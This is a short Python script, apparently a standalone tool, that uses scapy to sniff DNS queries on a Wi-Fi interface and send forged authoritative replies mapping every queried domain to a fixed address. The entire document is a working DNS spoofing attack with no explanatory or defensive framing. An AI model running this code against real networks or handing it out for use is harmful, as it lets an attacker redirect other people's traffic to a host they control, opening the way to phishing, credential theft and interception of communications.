from scapy.all import send, sniff, IP, UDP, DNS, DNSRR

def dns_request_handler(pkt):
    if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
        spoofed_ip = "1.2.3.4"  
        target_ip = pkt[IP].src
        target_port = pkt[UDP].sport
        transaction_id = pkt[DNS].id
        queried_domain = pkt[DNS].qd.qname

        # Craft the DNS response
        dns_response = IP(dst=target_ip, src=pkt[IP].dst) / \
                       UDP(dport=target_port, sport=53) / \
                       DNS(id=transaction_id, qr=1, aa=1, qd=pkt[DNS].qd,
                           an=DNSRR(rrname=queried_domain, ttl=10, rdata=spoofed_ip))

        send(dns_response, iface="Wi-Fi", verbose=0)  
        print(f"Sent spoofed DNS response for {queried_domain.decode()} to {target_ip}")

if __name__ == "__main__":
    try:
        sniff(filter="udp port 53", prn=dns_request_handler, iface="Wi-Fi")
    except KeyboardInterrupt:
        print("done.")